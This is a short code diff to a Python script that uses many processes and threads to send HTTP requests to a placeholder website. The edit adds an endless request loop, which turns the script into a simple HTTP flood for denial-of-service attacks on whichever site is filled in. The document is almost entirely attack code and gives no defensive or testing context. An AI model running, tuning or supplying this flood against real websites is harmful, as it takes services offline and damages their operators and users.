@@ -1,13 +1,14 @@
 import requests, threading
 from multiprocessing import Process
 
-number_procs = 100000
-number_threads = 4
-webserver = "{{INSERT_WEBSITE_HERE}}"
+number_procs = 12
+number_threads = 100
+hostname = "{{INSERT_WEBSITE_HERE}}"
 
 class RequestThread(threading.Thread):
     def run(self):
-        requests.get(f"https://{webserver}/")
+        while True:
+            requests.get(f"https://{hostname}/")
 
 def request(number_threads):
     threads = []
